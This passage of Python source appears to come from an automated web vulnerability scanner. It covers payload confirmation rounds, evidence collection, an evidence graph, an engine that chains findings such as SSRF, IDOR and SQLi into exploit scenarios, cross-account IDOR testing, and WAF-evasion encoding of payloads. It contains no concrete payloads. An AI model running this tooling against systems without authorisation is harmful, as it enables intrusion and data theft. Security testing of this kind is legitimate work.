            notes.append("Round 1: response matches baseline")

        await asyncio.sleep(self._delay)

        # Round 2 — modified payload (different encoding)
        alt_payload = payload
        if encoding_fw:
            variants = encoding_fw.variants(payload, max_variants=3)
            if variants:
                alt_payload = variants[0].encoded

        r2_resp, r2_elapsed = await self._send(url, method, alt_payload, headers)
        diff2 = self._diff.compare(baseline_response, r2_resp)
        if diff2.is_different:
            positive_rounds += 1
            all_snippets.extend(diff2.evidence_snippets)
            notes.append("Round 2: anomalous response with modified payload")

        await asyncio.sleep(self._delay)

        # Round 3 — negative control
        r3_resp, _ = await self._send(url, method, negative_value, headers)
        diff3 = self._diff.compare(baseline_response, r3_resp)
        negative_clean = not diff3.is_different

        if not negative_clean:
            notes.append(
                "Round 3 WARNING: negative control also produced anomalous response "
                "— likely a false positive"
            )

        confirmed = (positive_rounds >= 2) and negative_clean

        # Confidence score
        confidence = (positive_rounds / 2) * 0.70
        if negative_clean:
            confidence += 0.30
        confidence = min(1.0, confidence)

        return ConfirmationResult(
            confirmed=confirmed,
            rounds=self._rounds,
            positive_rounds=positive_rounds,
            negative_control_clean=negative_clean,
            confidence_score=round(confidence, 3),
            evidence_snippets=list(dict.fromkeys(all_snippets))[:10],
            notes=notes,
        )

    async def _send(
        self,
        url: str,
        method: str,
        payload: str,
        headers: Dict[str, str],
    ) -> Tuple[HTTPResponse, float]:
        """Send a request and return (response, elapsed_seconds)."""
        t0 = time.monotonic()
        try:
            if method.upper() == "GET":
                # Inject into first query parameter
                sep = "&" if "?" in url else "?"
                resp = await self._client.get(
                    f"{url}{sep}_p={urllib.parse.quote(payload)}",
                    headers=headers,
                )
            else:
                resp = await self._client.post(
                    url,
                    data={"_p": payload},
                    headers=headers,
                )
        except Exception:
            # Return a dummy response on network error
            resp = HTTPResponse(url=url, status_code=0, headers={}, body=b"")
        elapsed = time.monotonic() - t0
        return resp, elapsed


# ---------------------------------------------------------------------------
# 7.  Evidence Collection Framework
# ---------------------------------------------------------------------------

class EvidenceType(str, Enum):
    REQUEST_RESPONSE = "request_response"
    SCREENSHOT       = "screenshot"
    HEADER           = "header"
    COOKIE           = "cookie"
    DOM_CHANGE       = "dom_change"
    TIMING           = "timing"
    LOG_ENTRY        = "log_entry"
    STACK_TRACE      = "stack_trace"
    ERROR_MESSAGE    = "error_message"
    NETWORK_ACTIVITY = "network_activity"
    DIFF_RESULT      = "diff_result"


@dataclass
class EvidenceItem:
    """One piece of evidence linked to a finding."""
    evidence_id: str
    evidence_type: EvidenceType
    data: Any                       # raw evidence payload
    timestamp: float = field(default_factory=time.time)
    url: str = ""
    notes: str = ""
    quality: EvidenceQuality = EvidenceQuality.SIZE_CHANGE

    def to_dict(self) -> Dict[str, Any]:
        data_repr = self.data
        if isinstance(data_repr, HTTPResponse):
            data_repr = {
                "status": data_repr.status_code,
                "headers": dict(data_repr.headers),
                "body_preview": (data_repr.text or "")[:500],
            }
        elif isinstance(data_repr, DiffResult):
            data_repr = {
                "is_different": data_repr.is_different,
                "significance": data_repr.significance,
                "notes": data_repr.notes,
                "snippets": data_repr.evidence_snippets,
            }
        return {
            "id": self.evidence_id,
            "type": self.evidence_type.value,
            "url": self.url,
            "timestamp": self.timestamp,
            "quality": self.quality.name,
            "notes": self.notes,
            "data": data_repr,
        }


class EvidenceCollectionFramework:
    """
    Structured store for all evidence gathered during a scan.

    Each finding gets a ``collection_id``; evidence items are attached to it.
    Supports serialisation to JSON for report generation.
    """

    def __init__(self) -> None:
        # collection_id → list of EvidenceItem
        self._store: Dict[str, List[EvidenceItem]] = defaultdict(list)
        self._counter = 0

    def new_collection(self) -> str:
        """Create a new evidence collection and return its ID."""
        cid = f"EV-{self._counter:05d}"
        self._counter += 1
        self._store[cid] = []
        return cid

    def add(
        self,
        collection_id: str,
        evidence_type: EvidenceType,
        data: Any,
        *,
        url: str = "",
        notes: str = "",
        quality: EvidenceQuality = EvidenceQuality.SIZE_CHANGE,
    ) -> EvidenceItem:
        item = EvidenceItem(
            evidence_id=f"{collection_id}-{len(self._store[collection_id]):03d}",
            evidence_type=evidence_type,
            data=data,
            url=url,
            notes=notes,
            quality=quality,
        )
        self._store[collection_id].append(item)
        return item

    def get(self, collection_id: str) -> List[EvidenceItem]:
        return list(self._store.get(collection_id, []))

    def to_dict(self, collection_id: str) -> List[Dict[str, Any]]:
        return [e.to_dict() for e in self.get(collection_id)]

    def all_collections(self) -> Dict[str, List[EvidenceItem]]:
        return dict(self._store)

    def summary(self) -> Dict[str, Any]:
        return {
            "total_collections": len(self._store),
            "total_items": sum(len(v) for v in self._store.values()),
            "by_type": self._count_by_type(),
        }

    def _count_by_type(self) -> Dict[str, int]:
        counts: Dict[str, int] = defaultdict(int)
        for items in self._store.values():
            for item in items:
                counts[item.evidence_type.value] += 1
        return dict(counts)


# ---------------------------------------------------------------------------
# 8.  Evidence Graph
# ---------------------------------------------------------------------------

@dataclass
class GraphNode:
    """Node in the evidence relationship graph."""
    node_id: str
    node_type: str          # "technology" | "endpoint" | "parameter" | "finding" | "asset"
    label: str
    attributes: Dict[str, Any] = field(default_factory=dict)


@dataclass
class GraphEdge:
    """Directed relationship between two graph nodes."""
    from_id: str
    to_id: str
    relation: str           # e.g. "has_parameter" | "leads_to" | "confirms" | "uses"
    weight: float = 1.0


class EvidenceGraph:
    """
    Directed property graph linking all evidence entities discovered during
    a scan: technologies → endpoints → parameters → findings → assets.

    Enables the AttackChainEngine to traverse relationships and infer new
    attack paths automatically.
    """

    def __init__(self) -> None:
        self._nodes: Dict[str, GraphNode] = {}
        self._edges: List[GraphEdge] = []
        self._adj: Dict[str, List[GraphEdge]] = defaultdict(list)   # outgoing edges

    # -- Node management -----------------------------------------------------

    def add_node(
        self,
        node_id: str,
        node_type: str,
        label: str,
        **attributes: Any,
    ) -> GraphNode:
        node = GraphNode(node_id=node_id, node_type=node_type,
                         label=label, attributes=attributes)
        self._nodes[node_id] = node
        return node

    def get_node(self, node_id: str) -> Optional[GraphNode]:
        return self._nodes.get(node_id)

    # -- Edge management -----------------------------------------------------

    def add_edge(
        self,
        from_id: str,
        to_id: str,
        relation: str,
        weight: float = 1.0,
    ) -> GraphEdge:
        edge = GraphEdge(from_id=from_id, to_id=to_id,
                         relation=relation, weight=weight)
        self._edges.append(edge)
        self._adj[from_id].append(edge)
        return edge

    def neighbours(self, node_id: str, relation: Optional[str] = None) -> List[GraphNode]:
        """Return nodes reachable from ``node_id`` (optionally filtered by relation)."""
        result: List[GraphNode] = []
        for edge in self._adj.get(node_id, []):
            if relation is None or edge.relation == relation:
                nb = self._nodes.get(edge.to_id)
                if nb:
                    result.append(nb)
        return result

    # -- Graph queries -------------------------------------------------------

    def findings_for_endpoint(self, endpoint_id: str) -> List[GraphNode]:
        return self.neighbours(endpoint_id, relation="has_finding")

    def endpoints_for_technology(self, tech_id: str) -> List[GraphNode]:
        return self.neighbours(tech_id, relation="has_endpoint")

    def all_findings(self) -> List[GraphNode]:
        return [n for n in self._nodes.values() if n.node_type == "finding"]

    def to_dict(self) -> Dict[str, Any]:
        return {
            "nodes": [
                {"id": n.node_id, "type": n.node_type, "label": n.label,
                 **n.attributes}
                for n in self._nodes.values()
            ],
            "edges": [
                {"from": e.from_id, "to": e.to_id,
                 "relation": e.relation, "weight": e.weight}
                for e in self._edges
            ],
        }


# ---------------------------------------------------------------------------
# 9.  Attack Chain Engine
# ---------------------------------------------------------------------------

@dataclass
class AttackStep:
    """One step in an attack chain."""
    step_number: int
    finding_id: str
    finding_title: str
    action: str             # human-readable description of the step
    impact: str
    prerequisite: Optional[str] = None  # previous step's finding_id


@dataclass
class AttackChain:
    """A sequence of exploit steps leading to a high-impact outcome."""
    chain_id: str
    title: str
    description: str
    steps: List[AttackStep]
    final_impact: str
    severity: str           # Critical | High | Medium | Low
    cvss_estimate: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.chain_id,
            "title": self.title,
            "description": self.description,
            "severity": self.severity,
            "cvss_estimate": self.cvss_estimate,
            "final_impact": self.final_impact,
            "steps": [
                {
                    "step": s.step_number,
                    "finding": s.finding_id,
                    "title": s.finding_title,
                    "action": s.action,
                    "impact": s.impact,
                }
                for s in self.steps
            ],
        }


class AttackChainEngine:
    """
    Analyses the set of confirmed findings and constructs realistic exploit
    chains showing how an attacker could combine multiple vulnerabilities
    to achieve a higher-impact outcome.

    Uses the EvidenceGraph to traverse finding → parameter → endpoint
    relationships and identify logical attack paths.
    """

    # Known chaining patterns: (trigger_vuln_types, chain_template)
    _CHAIN_PATTERNS: List[Tuple[List[str], Dict[str, Any]]] = [
        (
            ["ssrf", "idor"],
            {
                "title": "SSRF → Internal Service Enumeration + IDOR Data Exfiltration",
                "description": (
                    "SSRF allows pivoting to internal services; combined with IDOR "
                    "the attacker can enumerate and extract other users' data."
                ),
                "final_impact": "Full internal network exposure + user data exfiltration",
                "severity": "Critical",
                "cvss_estimate": 9.8,
            },
        ),
        (
            ["xss", "csrf"],
            {
                "title": "Stored XSS → CSRF Token Theft → Account Takeover",
                "description": (
                    "Stored XSS lets an attacker inject a payload that steals the "
                    "victim's CSRF token, enabling forged state-changing requests."
                ),
                "final_impact": "Account takeover / privilege escalation",
                "severity": "High",
                "cvss_estimate": 8.1,
            },
        ),
        (
            ["sqli", "auth_bypass"],
            {
                "title": "SQLi → Auth Bypass → Admin Panel Takeover",
                "description": (
                    "SQL injection in the login flow can bypass authentication entirely, "
                    "granting admin-level access without valid credentials."
                ),
                "final_impact": "Complete application compromise",
                "severity": "Critical",
                "cvss_estimate": 9.8,
            },
        ),
        (
            ["path_traversal", "ssrf"],
            {
                "title": "Path Traversal + SSRF → Cloud Metadata Exposure",
                "description": (
                    "Combining LFI/path traversal with SSRF can expose cloud instance "
                    "metadata (AWS/GCP/Azure), leaking IAM credentials."
                ),
                "final_impact": "Cloud credential theft → full cloud account takeover",
                "severity": "Critical",
                "cvss_estimate": 9.6,
            },
        ),
        (
            ["idor", "broken_access_control"],
            {
                "title": "IDOR + BAC → Horizontal + Vertical Privilege Escalation",
                "description": (
                    "IDOR enables access to other users' resources; broken access "
                    "controls allow escalation to admin roles."
                ),
                "final_impact": "Full user data exposure + admin compromise",
                "severity": "High",
                "cvss_estimate": 8.8,
            },
        ),
    ]

    def __init__(self, graph: Optional[EvidenceGraph] = None) -> None:
        self._graph = graph
        self._chain_counter = 0

    def build_chains(
        self,
        findings: List[Dict[str, Any]],  # list of finding dicts with "vuln_type"
    ) -> List[AttackChain]:
        """
        Match confirmed findings against known chaining patterns and return
        a list of applicable AttackChain objects.
        """
        found_types = {f.get("vuln_type", "").lower() for f in findings}
        chains: List[AttackChain] = []

        for trigger_types, template in self._CHAIN_PATTERNS:
            if all(t in found_types for t in trigger_types):
                chain = self._build_chain(template, findings, trigger_types)
                chains.append(chain)

        return sorted(chains, key=lambda c: c.cvss_estimate, reverse=True)

    def _build_chain(
        self,
        template: Dict[str, Any],
        findings: List[Dict[str, Any]],
        trigger_types: List[str],
    ) -> AttackChain:
        self._chain_counter += 1
        cid = f"CHAIN-{self._chain_counter:03d}"

        steps: List[AttackStep] = []
        prev_id: Optional[str] = None

        for i, vtype in enumerate(trigger_types, start=1):
            # Find first matching finding
            match = next(
                (f for f in findings if f.get("vuln_type", "").lower() == vtype),
                None,
            )
            if not match:
                continue

            step = AttackStep(
                step_number=i,
                finding_id=match.get("id", f"FIND-{i}"),
                finding_title=match.get("title", vtype.upper()),
                action=self._action_for(vtype),
                impact=self._impact_for(vtype),
                prerequisite=prev_id,
            )
            steps.append(step)
            prev_id = step.finding_id

        return AttackChain(
            chain_id=cid,
            title=template["title"],
            description=template["description"],
            steps=steps,
            final_impact=template["final_impact"],
            severity=template["severity"],
            cvss_estimate=template.get("cvss_estimate", 0.0),
        )

    @staticmethod
    def _action_for(vuln_type: str) -> str:
        return {
            "ssrf":                 "Forge server-side request to internal endpoint",
            "idor":                 "Access another user's resource via predictable ID",
            "xss":                  "Inject persistent script into application",
            "csrf":                 "Forge authenticated action as victim user",
            "sqli":                 "Inject SQL to bypass logic or extract data",
            "auth_bypass":          "Bypass authentication check entirely",
            "path_traversal":       "Read arbitrary files on the server filesystem",
            "broken_access_control":"Access resource outside authorised scope",
            "cmdi":                 "Execute arbitrary OS commands on the server",
            "ssti":                 "Execute template expressions for RCE",
        }.get(vuln_type, f"Exploit {vuln_type} vulnerability")

    @staticmethod
    def _impact_for(vuln_type: str) -> str:
        return {
            "ssrf":                 "Reach internal services / cloud metadata",
            "idor":                 "Access unauthorised data",
            "xss":                  "Session hijacking / credential theft",
            "csrf":                 "Perform actions as victim",
            "sqli":                 "Database dump / authentication bypass",
            "auth_bypass":          "Unauthenticated admin access",
            "path_traversal":       "Sensitive file disclosure",
            "broken_access_control":"Privilege escalation",
            "cmdi":                 "Remote code execution",
            "ssti":                 "Remote code execution",
        }.get(vuln_type, "Undefined impact")


# ---------------------------------------------------------------------------
# 10.  Multi-Account Framework
# ---------------------------------------------------------------------------

@dataclass
class AccountSession:
    """Represents one authenticated (or anonymous) test account."""
    account_id: str
    role: str           # e.g. "admin" | "user_a" | "user_b" | "anonymous"
    cookies: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    auth_token: Optional[str] = None
    username: str = ""
    metadata: Dict[str, Any] = field(default_factory=dict)

    def request_headers(self) -> Dict[str, str]:
        """Merge auth token into headers if present."""
        h = dict(self.headers)
        if self.auth_token:
            h["Authorization"] = f"Bearer {self.auth_token}"
        return h


@dataclass
class CrossAccountTestResult:
    """Result of testing one endpoint with two different sessions."""
    url: str
    method: str
    requester_role: str
    resource_owner_role: str
    requester_got_access: bool
    status_codes: Tuple[int, int]       # (owner_status, requester_status)
    body_similarity: float              # 0=completely different, 1=identical
    is_idor_candidate: bool
    notes: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "method": self.method,
            "requester_role": self.requester_role,
            "resource_owner_role": self.resource_owner_role,
            "access_granted_to_requester": self.requester_got_access,
            "status_owner": self.status_codes[0],
            "status_requester": self.status_codes[1],
            "body_similarity": round(self.body_similarity, 3),
            "idor_candidate": self.is_idor_candidate,
            "notes": self.notes,
        }


class MultiAccountFramework:
    """
    Manages multiple authenticated sessions and orchestrates cross-account
    testing for IDOR, BOLA, and Broken Access Control vulnerabilities.

    Usage::

        maf = MultiAccountFramework(client, diff_engine)
        maf.add_session("user_a", "user",  cookies={"session": "aaa..."})
        maf.add_session("user_b", "user",  cookies={"session": "bbb..."})
        maf.add_session("admin",  "admin", headers={"X-API-Key": "xxx"})

        result = await maf.test_cross_access(
            url="https://target.com/api/invoices/42",
            method="GET",
            owner_id="user_a",
            requester_id="user_b",
        )
        if result.is_idor_candidate:
            print("IDOR detected!")
    """

    def __init__(
        self,
        client: HTTPClient,
        diff_engine: Optional[DifferentialAnalysisEngine] = None,
    ) -> None:
        self._client = client
        self._diff   = diff_engine or DifferentialAnalysisEngine()
        self._sessions: Dict[str, AccountSession] = {}

    def add_session(
        self,
        account_id: str,
        role: str,
        *,
        cookies: Optional[Dict[str, str]] = None,
        headers: Optional[Dict[str, str]] = None,
        auth_token: Optional[str] = None,
        username: str = "",
        metadata: Optional[Dict[str, Any]] = None,
    ) -> AccountSession:
        """Register a new authenticated session."""
        session = AccountSession(
            account_id=account_id,
            role=role,
            cookies=cookies or {},
            headers=headers or {},
            auth_token=auth_token,
            username=username,
            metadata=metadata or {},
        )
        self._sessions[account_id] = session
        return session

    def get_session(self, account_id: str) -> Optional[AccountSession]:
        return self._sessions.get(account_id)

    def sessions_by_role(self, role: str) -> List[AccountSession]:
        return [s for s in self._sessions.values() if s.role == role]

    async def test_cross_access(
        self,
        url: str,
        method: str,
        owner_id: str,
        requester_id: str,
        *,
        body: Optional[Dict[str, Any]] = None,
    ) -> CrossAccountTestResult:
        """
        Fetch ``url`` as both the resource owner and a different account,
        then compare responses to detect unauthorised access (IDOR / BOLA).
        """
        owner     = self._sessions.get(owner_id)
        requester = self._sessions.get(requester_id)

        if not owner or not requester:
            missing = []
            if not owner:     missing.append(owner_id)
            if not requester: missing.append(requester_id)
            raise ValueError(f"Sessions not registered: {missing}")

        owner_resp = await self._fetch(url, method, owner, body)
        req_resp   = await self._fetch(url, method, requester, body)

        diff = self._diff.compare(owner_resp, req_resp)
        similarity = 1.0 - diff.content_diff_score

        # Access granted if requester gets 2xx AND response resembles owner's
        req_got_access = (
            200 <= req_resp.status_code < 300
            and owner_resp.status_code == req_resp.status_code
        )
        is_idor = req_got_access and similarity >= 0.70

        notes: List[str] = []
        if is_idor:
            notes.append(
                f"IDOR: {requester_id} ({requester.role}) received same "
                f"response as {owner_id} ({owner.role}) — "
                f"similarity={similarity:.0%}"
            )
        if req_resp.status_code != owner_resp.status_code:
            notes.append(
                f"Status differs: owner={owner_resp.status_code}, "
                f"requester={req_resp.status_code}"
            )

        return CrossAccountTestResult(
            url=url,
            method=method,
            requester_role=requester.role,
            resource_owner_role=owner.role,
            requester_got_access=req_got_access,
            status_codes=(owner_resp.status_code, req_resp.status_code),
            body_similarity=similarity,
            is_idor_candidate=is_idor,
            notes=notes,
        )

    async def sweep_endpoints(
        self,
        endpoints: List[Tuple[str, str]],
        owner_id: str,
        requester_id: str,
    ) -> List[CrossAccountTestResult]:
        """
        Run cross-access tests across a list of (url, method) pairs.
        Returns only results where IDOR is suspected.
        """
        results: List[CrossAccountTestResult] = []
        for url, method in endpoints:
            try:
                result = await self.test_cross_access(url, method, owner_id, requester_id)
                if result.is_idor_candidate:
                    results.append(result)
            except Exception:
                pass
        return results

    async def _fetch(
        self,
        url: str,
        method: str,
        session: AccountSession,
        body: Optional[Dict[str, Any]],
    ) -> HTTPResponse:
        headers = session.request_headers()
        # Build cookie header
        if session.cookies:
            headers["Cookie"] = "; ".join(
                f"{k}={v}" for k, v in session.cookies.items()
            )
        try:
            if method.upper() == "GET":
                return await self._client.get(url, headers=headers)
            elif method.upper() == "POST":
                return await self._client.post(url, json=body, headers=headers)
            elif method.upper() == "PUT":
                return await self._client.put(url, json=body, headers=headers)
            elif method.upper() == "DELETE":
                return await self._client.delete(url, headers=headers)
            else:
                return await self._client.get(url, headers=headers)
        except Exception:
            return HTTPResponse(url=url, status_code=0, headers={}, body=b"")


# ---------------------------------------------------------------------------
# 11.  DiscoveryOrchestrator  (top-level entry point)
# ---------------------------------------------------------------------------

@dataclass
class DiscoveryReport:
    """Aggregated output from the full discovery phase."""
    target_url: str
    classified_endpoints: List[ClassifiedEndpoint]
    high_risk_endpoints: List[ClassifiedEndpoint]
    evidence_summary: Dict[str, Any]
    attack_chains: List[AttackChain]
    graph: EvidenceGraph
    duration_seconds: float

    def to_dict(self) -> Dict[str, Any]:
        return {
            "target": self.target_url,
            "duration_seconds": round(self.duration_seconds, 2),
            "endpoint_count": len(self.classified_endpoints),
            "high_risk_endpoint_count": len(self.high_risk_endpoints),
            "high_risk_endpoints": [e.to_dict() for e in self.high_risk_endpoints],
            "attack_chains": [c.to_dict() for c in self.attack_chains],
            "evidence": self.evidence_summary,
        }


class DiscoveryOrchestrator:
    """
    Top-level coordinator for discovery.

    Wires together:
      EndpointClassificationEngine → ParameterIntelligenceEngine →
      ContextAwarePayloadFramework + EncodingFramework →
      DifferentialAnalysisEngine → TripleConfirmationFramework →
      EvidenceCollectionFramework + EvidenceGraph → AttackChainEngine

    Typical scan flow::

        orchestrator = DiscoveryOrchestrator(client, target)
        report = await orchestrator.run(raw_endpoints, confirmed_findings)
    """

    def __init__(self, client: HTTPClient, target: ScanTarget) -> None:
        self.client        = client
        self.target        = target
        self.classifier    = EndpointClassificationEngine()
        self.param_engine  = ParameterIntelligenceEngine()
        self.payload_fw    = ContextAwarePayloadFramework()
        self.encoding_fw   = EncodingFramework()
        self.diff_engine   = DifferentialAnalysisEngine()
        self.evidence_fw   = EvidenceCollectionFramework()
        self.graph         = EvidenceGraph()
        self.chain_engine  = AttackChainEngine(self.graph)
        self.multi_account = MultiAccountFramework(client, self.diff_engine)

    async def run(
        self,
        raw_endpoints: List[Tuple[str, str]],   # (url, method)
        confirmed_findings: Optional[List[Dict[str, Any]]] = None,
    ) -> DiscoveryReport:
        t0 = time.monotonic()

        # 1. Classify all endpoints
        classified = self.classifier.classify_batch(raw_endpoints)
        high_risk  = [e for e in classified if e.risk_score >= 0.75]

        # 2. Enrich each endpoint with parameter intelligence
        for ep in classified:
            ep.parameters = self.param_engine.extract_from_url(ep.url)

            # Register in the graph
            ep_node_id = hashlib.md5(ep.url.encode()).hexdigest()[:12]
            self.graph.add_node(
                ep_node_id, "endpoint", ep.url,
                method=ep.method,
                # NOTE: must NOT be named `type` — GraphNode.to_dict() already
                # emits a top-level "type" key for node_type ("endpoint"),
                # and `**n.attributes` is merged in afterwards, so an
                # attribute literally called `type` used to silently clobber
                # it with the endpoint's category (e.g. "unknown"), making
                # every endpoint node look like it had no type at all.
                endpoint_category=ep.endpoint_type.value,
                risk=ep.risk_score,
            )

            for param in ep.parameters:
                p_node_id = f"{ep_node_id}-{param.name}"
                self.graph.add_node(
                    p_node_id, "parameter", param.name,
                    param_type=param.param_type.value,
                    risk=param.risk_score,
                )
                self.graph.add_edge(ep_node_id, p_node_id, "has_parameter")

        # 3. Link findings to endpoints in the graph
        findings = confirmed_findings or []
        for f in findings:
            f_id = f.get("id", f"F-{id(f)}")
            self.graph.add_node(
                f_id, "finding", f.get("title", "Finding"),
                vuln_type=f.get("vuln_type", "unknown"),
                severity=f.get("severity", "unknown"),
            )
            # Link finding to its endpoint
            url = f.get("url", "")
            if url:
                ep_node_id = hashlib.md5(url.encode()).hexdigest()[:12]
                if self.graph.get_node(ep_node_id):
                    self.graph.add_edge(ep_node_id, f_id, "has_finding")

        # 4. Build attack chains from confirmed findings
        chains = self.chain_engine.build_chains(findings)

        # 5. Evidence summary
        ev_summary = self.evidence_fw.summary()

        duration = time.monotonic() - t0

        return DiscoveryReport(
            target_url=self.target.base_url,
            classified_endpoints=classified,
            high_risk_endpoints=high_risk,
            evidence_summary=ev_summary,
            attack_chains=chains,
            graph=self.graph,
            duration_seconds=duration,
        )

    def get_payloads_for_endpoint(
        self,
        ep: ClassifiedEndpoint,
        vuln_type: str,
        tech_stack: Optional[List[str]] = None,
        waf_detected: bool = False,
    ) -> List[ContextualPayload]:
        """Convenience: get context-aware payloads for a specific endpoint."""
        # Pick context based on endpoint type
        context_map: Dict[EndpointType, PayloadContext] = {
            EndpointType.SEARCH:        PayloadContext.SQL_STRING,
            EndpointType.ADMIN:         PayloadContext.HTML_TEXT,
            EndpointType.FILE_UPLOAD:   PayloadContext.PATH_SEGMENT,
            EndpointType.AUTHENTICATION:PayloadContext.SQL_STRING,
            EndpointType.API:           PayloadContext.JSON_STRING,
            EndpointType.GRAPHQL:       PayloadContext.JSON_STRING,
        }
        ctx = context_map.get(ep.endpoint_type, PayloadContext.HTML_TEXT)
        payloads = self.payload_fw.get_payloads(
            ctx, vuln_type,
            tech_stack=tech_stack,
            waf_detected=waf_detected,
        )
        # If WAF present, add encoded variants
        if waf_detected:
            extra: List[ContextualPayload] = []
            for p in payloads[:3]:
                best = self.encoding_fw.select_best(p.value)
                extra.append(ContextualPayload(
                    value=best.encoded,
                    context=ctx,
                    vuln_type=vuln_type,
                    expected_evidence=p.expected_evidence,
                    encoding=best.encoding_name,
                ))
            payloads = extra + payloads
        return payloads
